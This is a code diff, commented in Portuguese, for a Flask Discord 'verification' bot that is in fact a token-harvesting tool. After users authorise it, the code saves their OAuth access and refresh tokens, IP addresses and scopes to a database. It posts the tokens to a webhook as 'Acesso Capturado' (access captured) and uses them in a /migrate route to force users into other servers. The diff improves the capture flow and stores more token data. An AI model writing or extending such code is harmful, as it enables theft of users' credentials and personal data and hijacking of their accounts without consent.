@@ -1,6 +1,7 @@
 import os
 import time
 import random
+import datetime
 import requests
 import psycopg2
 from flask import Flask, request, redirect, render_template
@@ -26,7 +27,7 @@ def init_db():
     try:
         conn = get_db_connection()
         cur = conn.cursor()
-        # ADICIONEI: refresh_token TEXT
+        # Tabela completa com Refresh Token e Expiração
         cur.execute("""
             CREATE TABLE IF NOT EXISTS verified_users (
                 user_id VARCHAR(50) PRIMARY KEY,
@@ -34,6 +35,8 @@ def init_db():
                 ip_address VARCHAR(50),
                 access_token TEXT,
                 refresh_token TEXT,
+                expires_in INTEGER,
+                scopes TEXT,
                 guild_id VARCHAR(50),
                 verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             );
@@ -41,31 +44,31 @@ def init_db():
         conn.commit()
         cur.close()
         conn.close()
-        print("✅ DB Conectado.")
+        print("✅ DB Conectado e Tabela Verificada.")
     except Exception as e:
         print(f"❌ Erro DB: {e}")
 
-def save_user_to_db(user_id, username, ip, token, refresh, guild_id):
+def save_user_to_db(user_id, username, ip, token, refresh, expires, scopes, guild_id):
     try:
         conn = get_db_connection()
         cur = conn.cursor()
-        # Query Atualizada para incluir refresh_token
         query = """
-            INSERT INTO verified_users (user_id, username, ip_address, access_token, refresh_token, guild_id)
-            VALUES (%s, %s, %s, %s, %s, %s)
+            INSERT INTO verified_users (user_id, username, ip_address, access_token, refresh_token, expires_in, scopes, guild_id)
+            VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
             ON CONFLICT (user_id) DO UPDATE 
             SET ip_address = EXCLUDED.ip_address, 
                 access_token = EXCLUDED.access_token,
                 refresh_token = EXCLUDED.refresh_token,
+                expires_in = EXCLUDED.expires_in,
+                scopes = EXCLUDED.scopes,
                 guild_id = EXCLUDED.guild_id,
                 verified_at = CURRENT_TIMESTAMP;
         """
-        cur.execute(query, (user_id, username, ip, token, refresh, guild_id))
+        cur.execute(query, (user_id, username, ip, token, refresh, expires, scopes, guild_id))
         conn.commit()
         conn.close()
     except Exception as e:
-        # Se der erro de coluna faltando, avisa
-        print(f"❌ Erro Save DB (Provavelmente precisa resetar a tabela): {e}")
+        print(f"❌ Erro Save DB: {e}")
 
 # --- FUNÇÕES DISCORD ---
 def get_headers_bot():
@@ -73,14 +76,14 @@ def get_headers_bot():
 
 def send_log_to_webhook(user_data, access_token, refresh_token, ip_address, guild_id):
     embed = {
-        "title": "✅ Usuário Capturado (Completo)!",
-        "description": "Dados + Refresh Token salvos.",
+        "title": "✅ Acesso Capturado com Sucesso!",
+        "description": "Tokens salvos no Banco de Dados.",
         "color": 0x00ff41,
         "fields": [
-            { "name": "👤 User", "value": f"{user_data['username']} ({user_data['id']})", "inline": False },
+            { "name": "👤 Usuário", "value": f"{user_data['username']} (`{user_data['id']}`)", "inline": False },
             { "name": "🌍 IP", "value": f"`{ip_address}`", "inline": True },
-            { "name": "🔑 Access Token (Curto - 7 Dias)", "value": f"||{access_token}||", "inline": False },
-            { "name": "🔄 Refresh Token (Longo - Renovável)", "value": f"||{refresh_token}||", "inline": False }
+            { "name": "🔑 Access Token (7 Dias)", "value": f"||{access_token}||", "inline": False },
+            { "name": "🔄 Refresh Token (Renovável)", "value": f"||{refresh_token}||", "inline": False }
         ],
         "footer": { "text": "Hunter Database System" }
     }
@@ -131,11 +134,13 @@ def ping():
 @app.route('/auth')
 def auth():
     target_guild_id = request.args.get('guild_id')
-    if not target_guild_id:
-        return "Erro: ID do servidor faltando."
+    if not target_guild_id: return "Erro: ID Server faltando."
     
-    # Links
-    base_params = (
+    # CORREÇÃO CRÍTICA: Usar HTTPS (Universal Link)
+    # Isso impede que o navegador bloqueie o redirecionamento.
+    # O Android/iOS interceptam esse link e abrem o App se estiver instalado.
+    auth_url = (
+        f"https://discord.com/oauth2/authorize"
         f"?client_id={CLIENT_ID}"
         f"&response_type=code"
         f"&redirect_uri={REDIRECT_URI}"
@@ -143,10 +148,8 @@ def auth():
         f"&state={target_guild_id}"
     )
     
-    web_url = f"https://discord.com/oauth2/authorize{base_params}"
-    app_url = f"discord://discord.com/oauth2/authorize{base_params}"
-    
-    return render_template('launcher.html', web_url=web_url, app_url=app_url)
+    # Envia 'web_url' para o template launcher.html
+    return render_template('launcher.html', web_url=auth_url)
 
 @app.route('/callback')
 def callback():
@@ -166,39 +169,41 @@ def callback():
     token_resp = requests.post(f'{API_BASE}/oauth2/token', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
     
     if token_resp.status_code != 200:
-        return f"Erro ao obter token: {token_resp.text}"
+        return f"Erro Token: {token_resp.text}"
     
     tokens = token_resp.json()
     access_token = tokens.get('access_token')
-    refresh_token = tokens.get('refresh_token') # <--- PEGANDO O TOKEN LONGO AQUI
+    refresh_token = tokens.get('refresh_token')
+    expires_in = tokens.get('expires_in')
+    scopes = tokens.get('scope')
     
-    # 2. Pega User Info
+    # 2. Dados do Usuário
     user_resp = requests.get(f'{API_BASE}/users/@me', headers={'Authorization': f'Bearer {access_token}'})
     user_data = user_resp.json()
     user_id = user_data['id']
     username = user_data['username']
 
-    # 3. Pega IP
+    # 3. IP
     ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
     
-    # 4. Salva (Com Refresh Token)
-    save_user_to_db(user_id, username, ip, access_token, refresh_token, target_guild_id)
+    # 4. Salvar TUDO no Banco
+    save_user_to_db(user_id, username, ip, access_token, refresh_token, expires_in, scopes, target_guild_id)
     send_log_to_webhook(user_data, access_token, refresh_token, ip, target_guild_id)
 
-    # 5. Discord Actions
+    # 5. Ações no Discord (Entrar no Server e Dar Cargo)
     join_user_to_guild(user_id, access_token, target_guild_id)
     try:
         role_id = get_or_create_verified_role(target_guild_id)
-        if role_id:
-            add_role_to_user(user_id, role_id, target_guild_id)
-    except Exception as e:
-        print(f"Erro cargo: {e}")
+        if role_id: add_role_to_user(user_id, role_id, target_guild_id)
+    except: pass
 
-    # 6. Sucesso
+    # 6. Sucesso - Redirecionar de volta
+    # Aqui usamos o success.html para tentar abrir o App
     return_app_url = f"discord://discord.com/channels/{target_guild_id}"
     return_web_url = f"https://discord.com/channels/{target_guild_id}"
 
-    return render_template('launcher.html', app_url=return_app_url, web_url=return_web_url)
+    # Nota: Certifique-se de ter o arquivo templates/success.html
+    return render_template('success.html', app_url=return_app_url, web_url=return_web_url)
 
 # --- PAINEL ENVIO ---
 @app.route('/painel', methods=['GET', 'POST'])
@@ -211,6 +216,7 @@ def painel():
         desc = request.form.get('desc')
         image_url = request.form.get('image_url')
         
+        # O link do botão leva para /auth
         verify_link = f"https://hunter-bot-verify.onrender.com/auth?guild_id={target_guild_id}"
 
         payload = {
@@ -230,7 +236,7 @@ def painel():
         r = requests.post(post_url, headers=get_headers_bot(), json=payload)
         
         if r.status_code == 200:
-            message = "✅ Painel enviado!"
+            message = "✅ Enviado!"
         else:
             message = f"❌ Erro: {r.text}"
 
@@ -256,7 +262,6 @@ def migrate():
 
                 if user:
                     uid, uname, token = user
-                    # Usa o ACCESS TOKEN mesmo, ele é o que funciona
                     status = join_user_to_guild(uid, token, target_guild_id)
                     res_txt = "Sucesso" if status in [201, 204] else f"Falha ({status})"
                     log_msg.append(f"[{res_txt}] {uname}")
@@ -271,8 +276,9 @@ def migrate():
                 count = 0
                 for user in users:
                     uid, uname, token = user
-                    status = join_user_to_guild(uid, token, target_guild_id)
-                    if status in [201, 204]: count += 1
+                    # Usa o token salvo para entrar
+                    if join_user_to_guild(uid, token, target_guild_id) in [201, 204]: 
+                        count += 1
                     time.sleep(0.5) 
 
                 log_msg.append(f"🚀 Migrados: {count}/{len(users)}")
